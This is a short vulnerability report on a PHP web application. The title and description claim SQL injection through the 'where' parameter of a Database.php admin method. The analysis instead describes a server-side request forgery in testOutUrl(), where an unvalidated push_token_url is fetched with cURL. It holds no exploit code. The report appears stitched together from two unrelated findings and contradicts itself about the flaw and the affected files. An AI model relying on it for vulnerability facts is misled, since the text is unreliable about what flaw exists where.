# Vulnerability

SQL Inject

# Description

The where parameter in the rep method(in application/admin/controller/Database.php) is not properly sanitized, allowing an administrator to execute arbitrary SQL queries.

# Analysis

Vulnerability file: 
app/services/out/OutAccountServices.php (testOutUrl() method) and crmeb/services/HttpService.php (request() method) 

Vulnerability method: testOutUrl() 

Vulnerability analysis: testOutUrl() method receives the user-controlled push_token_url parameter and passes it to HttpService::getRequest(). HttpService::getRequest() uses cURL for HTTP/HTTPS requests, but does not host validate the requested URL. 
This allows authenticated administrators to exploit this vulnerability to scan internal network ports, detect internal services, or make HTTP requests to external services.
